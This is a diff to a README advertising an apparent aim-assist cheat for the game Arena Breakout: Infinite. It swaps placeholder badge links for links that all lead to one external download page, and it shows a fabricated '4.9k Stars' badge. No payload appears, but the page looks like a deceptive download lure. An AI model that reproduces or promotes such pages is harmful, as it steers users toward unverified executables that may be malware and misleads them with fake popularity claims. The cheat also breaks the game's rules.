@@ -11,10 +11,10 @@ Arena Breakout: Infinite is fast-paced, and a single missed shot can cost you. T
 \[!IMPORTANT]
 Aim assist is **not an aimbot**—it subtly guides aim for better tracking and stability. Perfect for training sessions and practicing recoil handling.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.9k Stars](https://img.shields.io/badge/⭐️%204.9k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://arena-breakout-infinite-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://arena-breakout-infinite-aim-assist.github.io/.github/)
+[![⭐️ 4.9k Stars](https://img.shields.io/badge/⭐️%204.9k-Stars-yellow?style=for-the-badge\&logo=github)](https://arena-breakout-infinite-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://arena-breakout-infinite-aim-assist.github.io/.github/)
 
 ---
 
